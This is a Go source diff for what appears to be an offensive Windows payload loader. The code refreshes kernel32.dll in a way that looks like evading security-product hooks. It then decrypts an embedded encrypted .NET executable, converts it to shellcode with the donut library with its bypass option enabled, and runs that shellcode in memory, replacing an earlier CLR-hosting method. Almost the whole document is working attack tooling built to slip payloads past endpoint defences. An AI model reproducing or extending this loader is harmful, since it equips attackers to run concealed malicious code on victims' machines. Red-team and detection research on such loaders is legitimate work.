@@ -2,17 +2,19 @@ package main
 
 import (
 	"fmt"
+	"golang.org/x/sys/windows/registry"
 	"log"
 	"os"
 	"strconv"
+	"strings"
 
-	"./assembly"
-	"golang.org/x/sys/windows/registry"
+	"./loader"
+	"./donut"
 )
 
-
+var Version string
 func init(){
-	Version := versionFunc()
+	Version = versionFunc()
 	if Version == "10.0" {
 		err := RefreshPE(`c:\windows\system32\kernel32.dll`)
 		if err != nil {
@@ -28,9 +30,8 @@ func init(){
 			log.Println("RefreshPE failed:", err)
 		}
 	}
-	
-}
 
+}
 func versionFunc() string {
 	k, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
 	Version, _, _ :=  k.GetStringValue("CurrentVersion")
@@ -45,46 +46,79 @@ func versionFunc() string {
 }
 
 func main() {
-	assemblyArgs := ""
+
+	entropy := 3
+
+	//  -PIC/SHELLCODE OPTIONS-
+	archStr := "x84"
+	bypass := 3
+	format := 1
+	action := 2
+
+	//  -FILE OPTIONS-
+
+	zFlag := 1
+
+	// go-donut only flags
+	params := ""
 	if len(os.Args) > 1 {
 		for i := 1 ;i < len(os.Args);i++{
 			if i == 1 {
-				assemblyArgs = os.Args[i]
+				params = os.Args[i]
 			}else{
-				assemblyArgs = assemblyArgs + " " + os.Args[i]
+				params = params + " " + os.Args[i]
 			}
 		}
-	}else{
-		assemblyArgs = " "
 	}
+
+
+	var err error
+	oep := uint64(0)
+
+	var donutArch donut.DonutArch
+	switch strings.ToLower(archStr) {
+	case "x32", "386":
+		donutArch = donut.X32
+	case "x64", "amd64":
+		donutArch = donut.X64
+	case "x84":
+		donutArch = donut.X84
+	default:
+		donutArch = donut.X64
+	}
+
+	config := new(donut.DonutConfig)
+	config.Arch = donutArch
+	config.Entropy = uint32(entropy)
+	config.OEP = oep
+	config.InstType = donut.DONUT_INSTANCE_PIC
+
+	config.Parameters = params
+	config.Bypass = bypass
+	config.Compress = uint32(zFlag)
+	config.Format = uint32(format)
+
+	config.ExitOpt = uint32(action)
 
 	key, err := Asset("data/aeskey.txt")
 	if err != nil {
 		panic(err)
 	}
-
 	assemblyBytesci, er := Asset("data/sharp.exe.cipher")
 
 	if er != nil {
 		panic(er)
 	}
-	hostingDLLci, er := Asset("data/clrx64.dll.cipher")
-
-	if er != nil {
-		panic(er)
-	}
+	version, er := Asset("data/version.txt")
 
 	assemblyBytes := decrypt(assemblyBytesci,key)
 
-	hostingDLL := decrypt(hostingDLLci,key)
-
-	fmt.Println("Decrypt Success... \n")
-
-	fmt.Println("dll: "+strconv.Itoa(len(hostingDLL)))
-	fmt.Println("bin: "+strconv.Itoa(len(assemblyBytes))+"\n")
-
-	err = assembly.ExecuteAssembly(hostingDLL, assemblyBytes, assemblyArgs, true)
-	if err != nil {
-		log.Fatal(err)
+	payload, err := donut.ShellcodeFromFile(string(version), config, assemblyBytes)
+	if err == nil {
+		b := payload.Bytes()
+		loader.Load(b)
 	}
+
 }
+
+
